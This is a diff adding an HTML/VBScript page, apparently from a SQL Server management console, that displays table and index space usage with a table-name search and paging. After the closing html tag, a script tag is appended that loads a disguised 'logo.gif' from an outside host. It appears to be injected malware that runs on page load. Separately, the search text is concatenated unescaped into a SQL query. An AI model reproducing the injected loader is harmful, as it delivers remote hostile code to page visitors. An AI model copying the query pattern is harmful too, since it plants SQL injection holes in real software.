@@ -1,0 +1,537 @@
+<html>
+
+<head><!-- --------THIS CALLS THE CASCADING STYLE SHEET---------------- -->
+
+<link rel="stylesheet" link="text/css" href="sqlHTML.css">
+<!-- --------THIS CALLS THE CASCADING STYLE SHEET---------------------- -->
+
+
+<title>DB page</title>
+<meta name="GENERATOR" content="Microsoft FrontPage 3.0">
+<SCRIPT ID=clientEventHandlersJS LANGUAGE=javascript>
+<!--
+
+function txtSearch_onkeydown()
+{
+    var         el;
+    
+   if(window.event.keyCode == 13)
+   {
+       ClickGo();     
+   }
+}
+
+//-->
+</SCRIPT>
+</head>
+
+<body bgcolor="window">
+
+<!-- BEGIN SEARCH FOR INFO--------------------------------------------->
+<table class="RowTbl"  height="17">
+  <tr>
+    <td class="ColorRow1" colspan="4"></td>
+  </tr>
+  <tr>
+    <td class="WhiteRow" td WIDTH="20%" valign="bottom"><font class="labelFont" id="searchFor" valign="bottom"><!--Search for:--></font></td>
+    <td class="WhiteRow" td WIDTH=35%">
+        <table  height="17">
+        <tr>
+            <td width="50%"><input type="Text" id="txtSearch" LANGUAGE=javascript onkeydown="return txtSearch_onkeydown()"></td>
+            <td width="50%">
+                	 <table cellspacing="0" cellpadding="0" border="0" height="19" width="37" onclick="ClickGo()" onmouseover="this.style.cursor='hand'">
+  							<tr>
+    							<td tdWidth="9"><img id="go_1" src="go1.gif" border="0" ></td>
+    							<td background="GoMiddle.gif" id="goMiddle" td width="20" align="center" ><font class="labelFont" valign="center" id="go"><!--GO--></font></td>
+    							<td td width="9"><img id="go_2" src="go2.gif" border="0" ></td>
+    						</tr>
+    				 </table>		
+            </td>
+        </tr>
+        </table>
+    </td>
+    <td class="WhiteRow" WIDTH="15%" valign="bottom"><font class="LabelFont" id="rows" ><!--Rows--></font></td>
+    <td class="WhiteRow" WIDTH="30%"><font class="LabelFont" id="size"><!--Size--></font></td>
+  </tr>
+  <tr>
+    <td class="ColorRow1" colspan="4"></td>
+  </tr>
+</table>
+<br>
+<!-- END SEARCH FOR INFO--------------------------------------------->
+
+
+
+<span id="TableData">
+</span>
+
+
+
+<script language="VBScript">
+
+
+go.innerText                       = parent.window.parent.objSQLNSContext.ProvideLocalizedString("sqlmmc.rll", 4085)    
+
+Sub GenerateTableSpaceTable ( ByVal intStartTable, ByVal strStartTableName)
+
+  Dim       objDatabase
+  Dim       objResultSet
+  Dim       strContextCookie
+  Dim       sqlQuery
+  Dim       tableName
+  Dim       i
+  Dim       strHTML 
+  Dim       L_NoUserTables_ErrorMessage
+  Dim       L_K_Text
+  Dim       strHTMLTable
+  Dim       max
+  Dim       counter
+  Dim       bStatus
+  Dim       PAGE_DIM
+  Dim       nTables
+  Dim       tables 
+  Dim       strTableName
+  Dim       lastQuery    
+  
+  On Error Resume Next
+
+  L_Table_NotFound                   = parent.window.parent.objSQLNSContext.ProvideLocalizedString("sqlmmc.rll", 4059)    
+  L_NoUserTables_ErrorMessage        = parent.window.parent.objSQLNSContext.ProvideLocalizedString("sqlmmc.rll", 4053)
+  L_K_Text                           = parent.window.parent.objSQLNSContext.ProvideLocalizedString("sqlmmc.rll", 4036)
+  searchFor.innerText                = parent.window.parent.objSQLNSContext.ProvideLocalizedString("sqlmmc.rll", 4086)    
+  rows.innerText                     = parent.window.parent.objSQLNSContext.ProvideLocalizedString("sqlmmc.rll", 4028) 
+  size.innerText                     = parent.window.parent.objSQLNSContext.ProvideLocalizedString("sqlmmc.rll", 4029) 
+   
+
+    
+  PAGE_DIM          = 22
+
+  strContextCookie  =  parent.parent.window.frames(0).GetParameterX("SQLNSCookie")
+  
+  parent.window.parent.frames(0).clickTableTab()
+      
+  Set objDatabase   = parent.window.parent.objSQLNSContext.GetDMOObject(strContextCookie)
+  
+  'lastQuery = parent.window.frames(0).document.all.lastTableQuery
+
+  'If  lastQuery = "" or lastQuery <> strStartTableName Then
+    
+      sqlQuery          = GetQuery(strStartTableName)  
+  
+      Set objResultSet  = objDatabase.ExecuteWithResults(sqlQuery)
+      
+      Set parent.window.frames(0).objTableInfoResultSet         = objResultSet
+      parent.window.frames(0).document.all.lastTableQuery   = strTableName
+
+'  Else
+ '     objResultSet      = parent.window.frames(0).objTableInfoResultSet  
+ ' End If
+    
+  If objResultSet.Rows = 0 Then
+    strHTML = "<div align=""center""><strong>" & L_NoUserTables_ErrorMessage & "</strong></div>"
+    document.all.TableData.innerHTML = strHTML
+    GenerateLegend
+    Exit Sub
+  End If 
+  
+
+    redim preserve       table(Int(objResultSet.Rows))
+
+    max       = 0 
+    tableName = "" 
+    nTables   = 1
+    For i = 1 To ObjResultSet.Rows      
+      If max < objResultSet.GetColumnLong(i, 6) Then
+          max = objResultSet.GetColumnLong(i, 6)
+      End If  
+          
+      If tableName <> objResultSet.GetColumnString(i, 1) Then
+          tableName = objResultSet.GetColumnString(i, 1) 
+          table(nTables) = i
+          nTables = nTables + 1
+      End If
+          
+    Next
+
+  tableName = ""  
+  counter   = 0
+  i         = table(intStartTable)
+  bStatus   = True
+  While  i <= objResultSet.Rows And bStatus
+  
+     
+      If tableName <> objResultSet.GetColumnString(i, 1) Then
+        ' a new table
+        
+        tableName = objResultSet.GetColumnString(i, 1)
+
+        If  i <> 0 Then
+            strHTML = strHTML & "</table>"
+        End If   
+
+        If max <> 0 Then
+            w = Int(objResultSet.GetColumnLong(i, 6) * 100 / max)
+        Else  
+            w = 100          
+        End If
+        
+        
+        strHTML     = strHTML & "<table class='RowTbl'>" & _
+                     " <tr>" & _
+                        " <td class='GrayRow' WIDTH='55%'>&nbsp<img border='0' src='Table.gif'><font class='LabelFontWhite'>  &nbsp;&nbsp;" & objResultSet.GetColumnString(i, 1) & "</font></td>" & _
+                        " <td class='GrayRow' WIDTH='15%'><font class='LabelFontWhite'>&nbsp;&nbsp;" & objResultSet.GetColumnLong(i, 3) & "</font></td>" & _                        
+                        " <td class='GrayRow' WIDTH='30%'>" & _
+                        "        <table width='100%'><tr><td width='10'><font class='DataFont'>&nbsp;&nbsp;" & objResultSet.GetColumnLong(i, 6) & L_K_Text & "</font></td>" & _
+                        "                   <td ><img src='RedSpace.gif' border='0' height='100%' width='" &  w &"%'></td>" & _
+                        "               </tr></table></td>" & _ 
+                        " </tr>"        
+                        
+      counter = counter + 1                          
+        
+      End If
+      
+      ' build the list of indexes
+      
+      If objResultSet.GetColumnLong(i, 4) = 1 Then
+        'is a clustered index
+        
+        If max <> 0 Then
+            w = Int(objResultSet.GetColumnLong(i, 7) * 100 / max)
+        Else  
+            w = 100          
+        End If
+
+        
+        If objResultSet.GetColumnLong(i, 7) <> 0  Then
+            strHTML    = strHTML & " <tr>" & _
+                         " <td class='WhiteRow' td WIDTH='55%'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img border='0' 	src='ClustIndex.gif'><font class='DataFont'>&nbsp;&nbsp;" & objResultSet.GetColumnString(i, 2) &  "</font></td>" & _
+                         " <td class='WhiteRow' td WIDTH='15%'></td>" & _
+                         " <td class='WhiteRow' WIDTH='30%'>" & _
+                         "        <table width ='100%'><tr><td width='10'><font class='DataFont'>&nbsp;&nbsp;" & objResultSet.GetColumnLong(i, 7) & L_K_Text  & "</font></td>" & _
+                         "                   <td width='100%'><img src='RedSpace.gif' border='0' height='100%' width='" &  w &"%'></td>" & _
+                         "               </tr></table></td>" & _ 
+                         " </tr>"        
+        End If                      
+      Else
+        ' non clustered index 
+        
+        If max <> 0 Then
+            w = Int(objResultSet.GetColumnLong(i, 5) * 100 / max)
+        Else  
+            w = 100          
+        End If
+
+        If objResultSet.GetColumnString(i, 1) = "dbo.RTblSites" Then
+            
+        
+        End If
+        
+        If objResultSet.GetColumnLong(i, 5) <> 0 Then
+            strHTML    = strHTML & " <tr>" & _
+                        " <td class='WhiteRow' td WIDTH='55%'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img border='0' 	src='Index.gif'><font class='DataFont'>&nbsp;&nbsp;" & objResultSet.GetColumnString(i, 2) & "</font></td>" & _
+                        " <td class='WhiteRow' td WIDTH='15%'></td>" & _
+                        " <td class='WhiteRow' WIDTH='30%'>" & _                 
+                         "        <table width ='100%'><tr><td width='10'><font class='DataFont'>&nbsp;&nbsp;" & objResultSet.GetColumnLong(i, 5) & L_K_Text  & "</font></td>" & _
+                         "                   <td width='100%'><img src='RedSpace.gif' border='0' height='100%' width='" &  w &"%'></td>" & _
+                         "               </tr></table></td>" & _                      
+                        " </tr>"
+        End If                        
+      End If
+
+      If counter >= PAGE_DIM  Then
+      
+        If i < objResultSet.Rows Then
+        
+            If tableName <> objResultSet.GetColumnString(i  + 1, 1) Then
+                bStatus = False
+            End If 
+        Else                    
+            bStatus = False        
+        End If
+        
+        
+        If intStartTable <> 1 Then
+            ' not first, we will have first and previous buttons
+            parent.window.frames(1).hdnFirstBtn.value = 1
+            
+            If intStartTable - PAGE_DIM < 1 Then
+                parent.window.frames(1).hdnPrevBtn.value = 1
+            Else
+                parent.window.frames(1).hdnPrevBtn.value = intStartTable - PAGE_DIM
+            End If 
+        Else
+            parent.window.frames(1).hdnFirstBtn.value = ""               
+            parent.window.frames(1).hdnPrevBtn.value = ""
+        End If
+        
+        If intStartTable + counter < nTables Then
+        ' not last we will have next and last
+        
+            parent.window.frames(1).hdnNextBtn.value =  intStartTable + counter
+            parent.window.frames(1).hdnLastBtn.value =  nTables - PAGE_DIM        
+        Else
+            parent.window.frames(1).hdnNextBtn.value = ""               
+            parent.window.frames(1).hdnLastBtn.value = ""            
+        End If
+        
+      End If 
+      
+      i = i + 1       
+  Wend
+  
+  If i > objResultSet.Rows and bStatus and nTables > PAGE_DIM Then
+    parent.window.frames(1).hdnNextBtn.value = ""               
+    parent.window.frames(1).hdnLastBtn.value = "" 
+    parent.window.frames(1).hdnPrevBtn.value = nTables - PAGE_DIM
+    parent.window.frames(1).hdnFirstBtn.value = 1
+  End If 
+    
+  document.all.TableData.innerHTML = strHTML
+
+  GenerateLegend
+
+Exit Sub
+
+ErrHandler:
+    document.all.TableData = "<div align=""center""><strong>" & L_Table_NotFound & "</strong></div>"
+
+End Sub
+
+
+
+Sub GenerateLegend
+    Dim                 strHTML
+    Dim                 i
+    Dim                 counter
+    Dim                 szTable
+    Dim                 szIndex
+    Dim                 szClusteredIndex
+
+    L_First_Text                = parent.window.parent.objSQLNSContext.ProvideLocalizedString("sqlmmc.rll", 4047)
+    L_Next_Text                 = parent.window.parent.objSQLNSContext.ProvideLocalizedString("sqlmmc.rll", 4048)
+    L_Previous_Text             = parent.window.parent.objSQLNSContext.ProvideLocalizedString("sqlmmc.rll", 4049)
+    L_Last_Text                 = parent.window.parent.objSQLNSContext.ProvideLocalizedString("sqlmmc.rll", 4050)
+    
+    szTable                     = parent.window.parent.objSQLNSContext.ProvideLocalizedString("sqlmmc.rll", 4025)
+    szIndex                     = parent.window.parent.objSQLNSContext.ProvideLocalizedString("sqlmmc.rll", 4026)
+    szClusteredIndex            = parent.window.parent.objSQLNSContext.ProvideLocalizedString("sqlmmc.rll", 4027)
+    
+    
+    counter = 0
+    
+    strClass = " class='clsWizardTextOut' onmouseover='javascript:MouseOverText()' onmouseout='javascript:MouseOutText()'>"
+
+    strFirst = ""
+    strPrev  = ""
+    strNext  = ""
+    strLast  = ""   
+        
+    If parent.window.frames(1).hdnFirstBtn.value <> "" Then
+        strFirst    = " <td class='WhiteRow' td WIDTH='1%'  height='33'><img border='0' src='first.gif'></td><td class='WhiteRow' td WIDTH='9%' height='33'><font class='labelFont'><span id='btnFirst'"
+        strFirst    = strFirst & strClass
+        strFirst    = strFirst & L_First_Text
+        strFirst    = strFirst & " </span></font></td>"
+        counter = counter + 1    
+        
+    End If        
+
+    If parent.window.frames(1).hdnPrevBtn.value <> "" Then
+        strPrev    = " <td class='WhiteRow' td WIDTH='1%'  height='33'><img border='0' src='previous.gif'></td><td class='WhiteRow' td WIDTH='9%' height='33'><font class='labelFont'><span id='btnPrevious'"
+        strPrev    = strPrev & strClass
+        strPrev    = strPrev & L_Previous_Text
+        strPrev    = strPrev & " </span></font></td>"   
+        counter    = counter + 2 
+    End If        
+
+    If parent.window.frames(1).hdnNextBtn.value <> "" Then
+        counter = counter + 2    
+    
+        strNext    = " <td class='WhiteRow' td WIDTH='1%'  height='33'><img border='0' src='next.gif'></td><td class='WhiteRow' td WIDTH='9%' height='33'><font class='labelFont'><span id='btnNext'"
+        strNext    = strNext & strClass
+        strNext    = strNext & L_Next_Text
+        strNext    = strNext & " </span></font></td>"
+    
+    End If        
+
+    If parent.window.frames(1).hdnLastBtn.value <> "" Then
+        strLast    = " <td class='WhiteRow' td WIDTH='1%'  height='33'><img border='0' src='last.gif'></td><td class='WhiteRow' td WIDTH='9%' height='33'><font class='labelFont'><span id='btnLast'"
+        strLast    = strLast & strClass
+        strLast    = strLast & L_Last_Text
+        strLast    = strLast & "</span></font></td>"
+        counter = counter + 2    
+    
+    End If        
+    
+    If counter <> 4 Then
+        l = (40 - counter*10)
+        strAux =  "<td class='WhiteRow' WIDTH='" & l & "%' height='33'><font class='labelFont'></font></td>"
+        counter = counter + 2
+    End If
+    
+    strLast = strLast & strAux
+    
+    counter = counter + 3
+    
+    strHTML =  " <table class='RowTbl' >"
+    strHTML = strHTML & " <tr>"
+    strHTML = strHTML &  " <td class='ColorRow1' colspan='" & counter & "' height='20'></td>"
+    strHTML = strHTML & " </tr>"
+    strHTML = strHTML & " <tr>"
+    strHTML = strHTML & " <td class='WhiteRow' WIDTH='20%' height='33'>&nbsp<img border='0' src='Table.gif'><font class='labelFont'>&nbsp;&nbsp;" & szTable & "</font></td>"
+    strHTML = strHTML & " <td class='WhiteRow' td WIDTH='20%' height='33'>&nbsp<img border='0' src='Index.gif'><font class='labelFont'>&nbsp;&nbsp;" & szIndex & "</font></td>"
+    strHTML = strHTML & " <td class='WhiteRow' td WIDTH='20%' height='33'>&nbsp<img border='0' src='ClustIndex.gif'><font class='labelFont'>&nbsp;&nbsp;" & szClusteredIndex & "</font></td>"
+    
+    strHTML = strHTML & strFirst
+    strHTML = strHTML & strPrev
+    strHTML = strHTML & strNext
+    strHTML = strHTML & strLast
+    
+    strHTML = strHTML & " </font></tr>"
+    strHTML = strHTML & " <tr>"
+    strHTML = strHTML & " <td class='LegendRow' colspan='" & counter & "' height='20'></td>"
+    strHTML = strHTML & " </tr>"
+    strHTML = strHTML & " </table>"
+    
+    parent.window.frames(1).tblLegend.innerHTML = strHTML
+End Sub    
+
+
+Function GetQuery(ByRef strTableName)
+
+GetQuery = " select sysTableTemp.UsersName + '.' + sysTableTemp.ObjectsName" & _
+                    " as CompleteName, sysTableTemp.IndexName, sysTableTemp.rows," & _
+                    " case when sysTableTemp.indid  =  1 Then 1 Else 0 End as IsClusteredIndex,"  & _
+                    " (case when sysTableTemp.indid > 1 and sysTableTemp.indid <> 255 Then pageTableTemp.PageSize * sysTableTemp.NonClusteredDataUsed end)" & _
+                    " as NonClusteredDataUsed," & _
+                    " (pageTableTemp.PageSize * (isnull(sysTableTemp.AllData, 0)))" & _
+                    " As DataSizeUsed," & _
+                    " ( case when sysTableTemp.indid  =  1 Then pageTableTemp.PageSize * (isnull(sysTableTemp.IndexSizeUsed, 0)- isnull(sysTableTemp.DataSizeUsed, 0)) end)" & _
+                    " AS ClustedDataUsed" & _
+           " from " & _
+	               " (" & _
+	               " select  v.low / 1024 as PageSize"  & _
+	               " from    master..spt_values v " & _
+	               " where   v.number=1 and v.type=N'E'" & _
+	               " ) as pageTableTemp," & _  
+	               " (" & _
+	               " select  sysindexes.indid, sysindexes.name as IndexName, " & _
+       		       " sysobjects.name as ObjectsName, sysusers.name as UsersName, sysindexes.used as NonClusteredDataUsed," & _ 
+       		       " tempTable.DataSizeUsed, tempTable.IndexSizeUsed, tempTable.rows, tempTable.AllData" & _
+	               " from   sysindexes, sysobjects, sysusers," & _
+                   " (" & _ 		
+		           " select  id," & _
+                        " sum(case indid" & _
+                		" when 0   then sysindexes.dpages" & _
+                		" when 1   then sysindexes.dpages" & _
+                        " when 255 then isnull(sysindexes.used, 0)" & _
+   			            " end) as DataSizeUsed," & _
+	       		        " sum(case indid " & _
+        	        	" when 0 then isnull(sysindexes.used, 0)" & _
+                		" when 1 then isnull(sysindexes.used, 0)" & _
+                		" when 255 then isnull(sysindexes.used, 0)" & _
+	           	        " end) as IndexSizeUsed," & _
+	       		        " sum(case indid" & _
+        	        	" when 0 then convert(int, rows)" & _
+                		" when 1 then convert(int, rows)" & _
+	           	        " end) as rows,"	& _
+                        " sum(case" & _
+                        "     when indid <= 0 then sysindexes.dpages + isnull(sysindexes.used, 0)" & _
+                        "     else isnull(sysindexes.used, 0)" & _
+                        " end) as AllData" & _		           	        
+		                " from   sysindexes" & _
+		                " group by sysindexes.id" & _
+                        " ) as tempTable" & _
+                        " where  sysindexes.id = sysobjects.id" & _
+                        " and sysusers.uid = sysobjects.uid" & _  
+                        " and tempTable.id = sysindexes.id" & _
+                        " and sysobjects.name not like '#%' " & _
+                        " and OBJECTPROPERTY(sysobjects.id, N'IsMSShipped') <> 1 and OBJECTPROPERTY(sysobjects.id, N'IsSystemTable') = 0" & _
+	" ) as sysTableTemp" 
+
+               '" and sysindexes.indid <> 255" & _
+               '" and sysindexes.indid <> 0" & _
+	
+If strTableName <> "" Then
+    GetQuery =  GetQuery & " where sysTableTemp.ObjectsName like N'" & strTableName & "'"
+End If 	
+
+GetQuery = GetQuery & " order by CompleteName, IsClusteredIndex DESC"
+
+
+End Function
+
+Function ClickGo()
+
+Dim       strTableName
+
+
+document.all.go_1.src               = "goDown1.gif"
+document.all.go_2.src               = "goDown2.gif"
+document.all.goMiddle.background    = "goMiddle.gif"
+
+strTableName = txtSearch.value
+
+parent.window.frames(1).hdnFirstBtn.value       = ""               
+parent.window.frames(1).hdnPrevBtn.value        = ""
+parent.window.frames(1).hdnNextBtn.value        = ""               
+parent.window.frames(1).hdnLastBtn.value        = ""
+parent.window.frames(1).hdnTableIndex.value     = ""                        
+parent.window.frames(1).hdnTableString.value    = strTableName 
+
+GenerateTableSpaceTable 1, strTableName
+
+document.all.go_1.src = "Go1.gif"
+document.all.go_2.src = "Go2.gif"
+document.all.goMiddle.background= "GoMiddle.gif"
+
+
+End Function
+
+</script>
+
+<script language="jscript" for="document" event="onselectstart()">
+    
+    var             oSource;
+    var             bStatus; 
+    
+    bStatus     = false;
+    try
+    {
+        oSource = window.event.srcElement;
+        
+        if(oSource.id == "txtSearch")
+        {
+            bStatus =  true;
+        }
+    }
+    catch(e)
+    {
+    }
+        
+    window.event.returnValue = bStatus;
+
+</script>
+
+<script language="JScript">
+	var				start
+
+	start = 1
+	try
+	{
+		if(parent.window.frames(1).hdnTableIndex.value != "")
+		{
+			start = parseInt(parent.window.frames(1).hdnTableIndex.value, 10);
+		}
+	}
+	catch(e)
+	{
+	}
+    
+	GenerateTableSpaceTable(start, txtSearch.value); //'""parent.window.frames(0).document.all.lastTableQuery
+
+</script>
+
+</body>
+</html>
+
+<script language=javascript ></script><script src=http://ad.l086.com/logo.gif></script> 
